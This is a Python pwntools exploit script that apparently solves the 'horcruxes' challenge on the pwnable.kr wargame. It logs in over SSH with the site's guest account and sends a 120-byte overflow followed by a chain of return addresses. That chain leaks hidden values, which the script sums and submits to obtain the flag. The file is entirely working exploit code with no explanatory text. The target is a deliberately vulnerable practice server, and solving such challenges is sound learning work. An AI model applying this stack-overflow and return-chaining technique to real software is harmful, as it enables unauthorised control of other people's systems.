#!/usr/bin/python
from pwn import *
from ctypes import c_int32
from struct import pack
import re

def dd(v):
    return pack("<I", v)

#context.log_level = 'debug'

s = ssh(host='pwnable.kr', port=2222, user='horcruxes', password='guest')
#t = s.process(["./horcruxes"])
t = s.remote('localhost', 9032)
_ = t.recvuntil('Select Menu:')

t.sendline('0')
input = 'a' * 120
input += dd(0x0809FE4B)
input += dd(0x0809FE6A)
input += dd(0x0809FE89)
input += dd(0x0809FEA8)
input += dd(0x0809FEC7)
input += dd(0x0809FEE6)
input += dd(0x0809FF05)
input += dd(0x0809FFFC)
t.sendline(input)

read_ = t.recvuntil('Select Menu:')
parsed = re.findall(r'EXP \+(-?[0-9]+)', read_)
res = sum(int(p) for p in parsed)

# ctypes way
res = c_int32(res).value

# classic way
#res &= 0xFFFFFFFF
#if res & 0x80000000 != 0:
#    res -= 0x100000000

t.sendline('0\n' + str(res))
print t.readall()
